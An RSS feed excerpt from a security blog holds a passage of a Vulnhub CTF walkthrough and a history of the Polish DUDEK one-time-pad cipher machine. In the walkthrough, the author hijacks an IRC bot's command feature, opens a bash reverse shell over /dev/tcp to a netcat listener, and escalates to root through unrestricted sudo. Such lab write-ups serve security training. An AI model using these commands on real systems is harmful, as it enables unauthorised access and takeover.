&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-first-look.png&quot; alt=&quot;First look at IRC&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of commands, let's take a look at them! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-commands.png&quot; alt=&quot;IRC commands&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Best option to gain his identity, would be kicking him from the chat. But how? Firstly we can take a look at the current processes running as waldo user. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo
ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo
waldo      642  0.0  0.2  29416  3024 ?        Ss   07:13   0:00 tmux new-session &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; irssi
waldo      687  0.0  0.0   4508   784 pts/0    Ss   07:13   0:00 &lt;span class=&quot;nt&quot;&gt;-sh&lt;/span&gt;
waldo      733  0.0  0.8 115744  8484 pts/0    Sl+  07:13   0:01 irssi
www-data  1414  0.0  0.0  11284   944 pts/1    S+   08:43   0:00 &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's remember the number of irssi process - 773. Now we can use vim to kill the process. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
&amp;lt;waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf            

E558: Terminal entry not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;terminfo
&lt;span class=&quot;s1&quot;&gt;'unknown'&lt;/span&gt; not known. Available &lt;span class=&quot;nb&quot;&gt;builtin &lt;/span&gt;terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to &lt;span class=&quot;s1&quot;&gt;'ansi'&lt;/span&gt;

:!kill 733st &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:60080&amp;gt;
        &lt;span class=&quot;c&quot;&gt;# The ServerName directive sets the request scheme, hostname and port th&lt;/span&gt;
at
        &lt;span class=&quot;c&quot;&gt;# the server uses to identify itself. This is used when creating&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# redirection URLs. In the context of virtual hosts, the ServerName&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# specifies what hostname must appear in the request's Host: header to&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# match this virtual host. For the default virtual host (this file) this&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# value is not decisive as it is used as a last resort host regardless.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# However, you must set it for any further virtual host explicitly.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#ServerName www.example.com&lt;/span&gt;

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        &lt;span class=&quot;c&quot;&gt;# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,&lt;/span&gt;
:!kill 733&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, a few moments later we can see that waldo has quit. We can now quickly change our name to his using &lt;b&gt;/nick waldo&lt;/b&gt; command, and fortunately, we'll be able to execute &lt;b&gt;.run&lt;/b&gt; command. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; waldo has quit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; You are now known as waldo
&amp;lt;waldo&amp;gt; .run whoami
&amp;lt;wallabysbot&amp;gt; b&lt;span class=&quot;s1&quot;&gt;'wallaby'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly let's start the listener on port 8080. Now let's enter this useful trick, which will provide us with a shell. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;waldo&amp;gt; .run bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.102/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 57524
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;624&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
wallaby@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;wallaby on ubuntu:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User wallaby may run the following commands on ubuntu:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: ALL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition we can freely use sudo. Amazing! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wallaby@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
whoami
root
&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;www
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 52
drwxr-xr-x 8 wallaby wallaby 4096 Dec 16  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 5 root    root    4096 Dec 16  2016 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 wallaby wallaby    1 Dec 30  2016 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby  220 Dec 16  2016 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby 3771 Dec 16  2016 .bashrc
drwx------ 3 wallaby wallaby 4096 Dec 16  2016 .cache
drwx------ 2 wallaby wallaby 4096 Dec 16  2016 .irssi
drwx------ 4 wallaby wallaby 4096 Dec 16  2016 .local
drwxrwxr-x 2 wallaby wallaby 4096 Dec 16  2016 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby  655 Dec 16  2016 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 wallaby wallaby   66 Dec 16  2016 .selected_editor
drwxrwxr-x 4 wallaby wallaby 4096 Dec 30  2016 .sopel
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby    0 Dec 16  2016 .sudo_as_admin_successful
drwxrwxr-x 3 wallaby wallaby 4096 Dec 16  2016 www
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 48
drwx------  4 root root 4096 Dec 27  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Dec 14  2016 ..
drwxr-xr-x  2 root root 4096 Dec 27  2016 backups
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root    1 Dec 27  2016 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Oct 22  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 root root  510 Dec 27  2016 check_level.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  342 Dec 16  2016 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   18 Dec 15  2016 .mysql_history
drwxr-xr-x  2 root root 4096 Dec 15  2016 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  148 Aug 17  2015 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   66 Dec 15  2016 .selected_editor
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  214 Dec 16  2016 .wget-hsts
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;c&quot;&gt;###CONGRATULATIONS###&lt;/span&gt;

You beat part 1 of 2 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s2&quot;&gt;&quot;Wallaby's Worst Knightmare&quot;&lt;/span&gt; series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you find any errors or interesting ways to root, I&lt;span class=&quot;s1&quot;&gt;'d love to hear about it.

Thanks guys!
-Waldo&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have the final flag, and the game is over. It was anothers great and educational machine from &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;Vulnhub&lt;/a&gt;. Thanks &lt;a href=&quot;https://www.arashparsa.com/&quot;&gt;Waldo&lt;/a&gt;!&lt;/p&gt;
</description>
        <pubDate>Sun, 16 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-wallabys-nightmare/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-wallabys-nightmare/</guid>
      </item>
    
      <item>
        <title>Dudek - Polish Cipher Machine</title>
        <description>&lt;p&gt;Everyone should have heard about involvment of Polish cryptographers in breaking Enigma. But there's another great story containing cryptography - &lt;b&gt;DUDEK&lt;/b&gt; cipher machine. &lt;/p&gt;

&lt;p&gt;After World War II, Polish People’s Republic was in need of system protecting undisclosed information. This task was assigned to Cipher Bureau of Ministry of Internal Affairs, so called &lt;b&gt;&quot;A&quot; Bureau&lt;/b&gt;. Many years of conducting research in cryptography and cryptanalysis, development of technologies made it the most specialized unit in whole country. Its history is still not fully revealed, but we know that in 1968 Bureau contained 5 departments and 2 independent sections. &lt;/p&gt;

&lt;p&gt;In 1964, Wielkopolskie Telecommunication Factory T-7 Teletra together with Cipher Bureau planned and developed a new cryptographic device called &lt;b&gt;TgS-1 DUDEK&lt;/b&gt; - acronym for &lt;b&gt;Dalekopisowe Urządzenie Do Elektronicznego Kodowania&lt;/b&gt; (Teleprinter Device for Electronic Coding). &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/teletra.jpg&quot; alt=&quot;Teletra Factory&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt; Wielkopolskie Telecommunication Factory T-7 Teletra&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;For encryption and decryption, it used Vernam Cipher, developed in 1918 by &lt;b&gt;Gilbert Sandford Vernam&lt;/b&gt;, and also known as One-Time Tape (OTT). In order to use OTT, you need 2 copies of the key (also known as pad), which have to be truely random data at least as long as the message. One copy of the key is kept by a user, second one has to be shared via secure channel, like meeting face to face. Then, to encrypt our data, we take corresponding characters of the message and pad, XOR them giving the first letter of the ciphertext and move on to the next characters. Recipient, after receaving the message has to reverse this operation - XOR each letter of ciphertext with each letter of the pad. Once used, pads must be completely destroyed to keep the security of the cipher. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-machine.jpg&quot; alt=&quot;Dudek Machine&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;TgS-1 DUDEK&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;The pad must be composed of truly random data, it must never be used more than once and it must be kept secure. If it's used correctly one-time pad is truely unbreakable system. But what happens when the key is used more than once?&lt;/p&gt;

&lt;p&gt;Soviet intelligence encrypted their communications with their agents in Britain using one-time pad. Cryptanalysists from &lt;b&gt;project Verona&lt;/b&gt;, which was a counterintelligence program initiated by the United States Army's Signal Intelligence Service, revealed that some of the one-time pad material had been incorrectly reused by the Soviets. In result, over a period of years, various secret communications were compromised. &lt;/p&gt;

&lt;p&gt;Altough we may think that nowadays it's easy to compute random numbers, it's actually still very hard task. Current pseudo-random generators rely on the state of the machine, input-output or even network state. As a result, in practice most personal computers are not able to produce true randomness. That's where &lt;b&gt;True Random Numbers Generators&lt;/b&gt; come in. It's a device that works on generating random numbers using physical processes such as thermal noise, quantum optics or photoelectric effects. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/trng.jpg&quot; alt=&quot;TRNG&quot; width=&quot;50%&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Example of TRNG&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;As we now know how Vernam Cipher works, let's come back to DUDEK. It was part of the teleprinter machine, suitable of encrypting and decrypting telegraphic character. Data could be entered manually, or using built in scanner, and it was sent with speed of 50 to 75 bits per second. Whole machine weighted 35kg with dimensions of 540x260x400mm in first version, or lighter 32kg mobile version TgS-1M with dimensions of 500x250x390mm. &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TgS-1 - basic version known in DDR as T-352&lt;/li&gt;
  &lt;li&gt;TgS-1M - mobile version known in DDR as T-353&lt;/li&gt;
  &lt;li&gt;TgS-1MS - mobile version&lt;/li&gt;
  &lt;li&gt;TgS-3 - newer version introduced in 1980 which used TTL logic&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-controls.png&quot; alt=&quot;Dudek Controls&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Dudek Controls&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-interior.jpg&quot; alt=&quot;Dudek Interior&quot; width=&quot;50%&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Interior of Dudek machine&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;As opposed to other devices in the sixites, DUDEK was built using magnetic core logic building blocks of the so-called UNILOG-30 family. By using a toriod cores with several windings, it was possible to create the basic logic gates, such as AND, OR, XOR and Inverter circuits. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-plans.jpg&quot; alt=&quot;Dudek Circuit&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Circuit of TgS-1 DUDEK&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Because of it's top secret cleareance, DUDEK was used almost in every special forces of the Ministry of Internal Affairs, Ministry of Foreign Affairs, Ministry of Defence, police and the National Bank of Poland. It is known that in 1986 there were already 1070 of such devices, and it was produced up until 2000, when the last units were pulled back from the police stations. &lt;/p&gt;

&lt;p&gt;These machines were very longevous, as they were expected to work at least 20 years. The last DUDEK was retired from a police station in 2011, while many machines still work in the museums. Unfortunately this project has to be closed, as research teams were shut, Teletra was sold to Alcatel and went bankrupt. At the same time computers and internet started to appear in Poland leading to the final decline. &lt;/p&gt;

&lt;h1&gt;Last Words&lt;/h1&gt;

&lt;p&gt;For me it's always amazing to hear such stories, especially stories that aren't widely heard even in the country of origin. That's why I wanted to write about this topic, holding together huge number of 5 references and somehow glue them together. But as always I hope you enjoyed and learned something new! &lt;/p&gt;

&lt;h1&gt;References&lt;/h1&gt;
&lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/DUDEK&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&quot;http://www.cyberdefence24.pl/398532,urzadzenie-szyfrujace-dudek-polska-enigma&quot;&gt;&lt;b&gt;Cyberdefence24 (PL)&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&quot;http://www.cryptomuseum.com/crypto/pl/dudek/index.htm&quot;&gt;&lt;b&gt;CryptoMuseum&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&quot;http://www.cs.miami.edu/home/burt/learning/Csc609.051/notes/02.html&quot;&gt;&lt;b&gt;CSMiami&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 04 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/tgs-1-dudek/</link>
        <guid isPermaLink="true">http://localhost:4000/tgs-1-dudek/</guid>
      </item>
    
  </channel>
</rss>
